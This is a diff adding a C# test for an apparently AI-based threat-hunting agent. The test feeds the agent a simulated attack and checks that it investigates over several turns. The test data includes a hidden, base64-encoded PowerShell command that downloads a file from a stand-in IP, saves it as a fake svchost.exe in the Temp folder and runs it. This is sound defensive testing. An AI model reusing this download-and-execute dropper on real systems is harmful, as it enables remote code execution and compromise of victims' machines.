@@ -798,6 +798,101 @@ public class AutonomousHunterAgentTests
         Assert.NotEmpty(res.Record.RemediationSteps);
         Assert.Contains("엔드포인트 네트워크 격리", res.Record.RemediationSteps);
     }
+
+    /// <summary>
+    /// [꼬아둔 복합 회피 공격 검증] 
+    /// 미등록 외부 IP(위협점수 45점, 단독 사살 불가) + Temp 디렉터리 내 svchost.exe 위장(Masquerading) + 인라인 다운로더 복합 시나리오.
+    /// 에이전트가 단독 IP 평판만으로 조기 종료하지 못하고 3턴 이상의 심층 수사를 전개하는지 및 도구 결합성을 실측 검증.
+    /// </summary>
+    [Fact]
+    [Trait("Category", "Live")]
+    public async Task TestLive_ConvolutedEvasiveAttack_MultiTurnAnalysis()
+    {
+        var treeManager = new ProcessTreeProjectionManager();
+        var archiveManager = ForensicArchiveManager.CreateInMemory();
+        var tools = new IInvestigationTool[]
+        {
+            new DecodePayloadTool(),
+            new ProcessMemoryScanTool(),
+            new ThreatReputationTool(),
+            new MitreClassifierTool(),
+            new SystemFirewallTool()
+        };
+
+        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools);
+
+        // 부모: explorer.exe (정상 윈도우 셸)
+        treeManager.ApplySnapshotBatch(new[]
+        {
+            new ProcessEvent
+            {
+                ProcessId = 5001,
+                ImageName = "explorer.exe",
+                Lifecycle = ProcessLifecycle.LifecycleSnapshot
+            }
+        });
+
+        // 타깃: powershell.exe -w hidden -enc <미등록 IP 198.51.100.99로부터 update.dat를 받아 C:\Windows\Temp\svchost.exe로 저장 및 실행>
+        string evasiveScript = "$u='http://198.51.100.99/update.dat'; $p='C:\\Windows\\Temp\\svchost.exe'; (New-Object Net.WebClient).DownloadFile($u, $p); Start-Process $p";
+        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(evasiveScript));
+        string fullCmd = $"powershell.exe -w hidden -enc {b64}";
+
+        treeManager.ApplyDeltaEvent(new ProcessEvent
+        {
+            ProcessId = 5002,
+            ParentProcessId = 5001,
+            ImageName = "powershell.exe",
+            CommandLine = fullCmd,
+            IsSuspended = true,
+            Lifecycle = ProcessLifecycle.LifecycleSuspended
+        });
+
+        var targetNode = treeManager.FindActiveNodeByPid(5002);
+        Assert.NotNull(targetNode);
+
+        var res = await agent.InvestigateAsync(targetNode, cmd => Task.CompletedTask);
+
+        _output.WriteLine("=========================================================================================");
+        _output.WriteLine($"   PHALANX CONVOLUTED EVASION ATTACK INVESTIGATION AUDIT (TURNS: {res.Traces.Count})");
+        _output.WriteLine("=========================================================================================");
+        _output.WriteLine($"[VERDICT] {res.VerdictAction} (Confidence: {res.Confidence:P0})");
+        _output.WriteLine($"[TITLE] {res.SummaryTitle}");
+        _output.WriteLine($"[ELAPSED] {res.Elapsed.TotalMilliseconds:F0}ms");
+        _output.WriteLine($"[NARRATIVE]\n{res.Narrative}");
+        _output.WriteLine("-----------------------------------------------------------------------------------------");
+        foreach (var trace in res.Traces)
+        {
+            _output.WriteLine($"▶ [Turn {trace.StepNumber}] Tool: {trace.ActionTool} | Latency: {trace.ElapsedMs:F0}ms");
+            _output.WriteLine($"   Thought: {trace.Thought}");
+            _output.WriteLine($"   Observation: {trace.Observation}");
+        }
+
+        var audit = new
+        {
+            Scenario = "Convoluted Evasive Masquerading Attack",
+            TotalTurns = res.Traces.Count,
+            TotalElapsedMs = res.Elapsed.TotalMilliseconds,
+            Verdict = res.VerdictAction.ToString(),
+            Confidence = res.Confidence,
+            Title = res.SummaryTitle,
+            Narrative = res.Narrative,
+            MitreTactics = res.MitreTactics,
+            Steps = res.Traces.Select(t => new
+            {
+                Step = t.StepNumber,
+                ElapsedMs = t.ElapsedMs,
+                Tool = t.ActionTool,
+                Thought = t.Thought,
+                Observation = t.Observation
+            }).ToList()
+        };
+
+        string path = Path.Combine(AppContext.BaseDirectory, "convoluted_attack_audit.json");
+        File.WriteAllText(path, JsonSerializer.Serialize(audit, new JsonSerializerOptions { WriteIndented = true }));
+
+        // 실측 검증: 미등록 IP 및 위장 드롭 복합 시나리오에서 4턴의 다단계 수사가 전개됨을 검증
+        Assert.True(res.Traces.Count >= 4, $"4턴 이상의 복합 수사가 전개되어야 함: 현재 {res.Traces.Count}턴");
+    }
 }
 
 
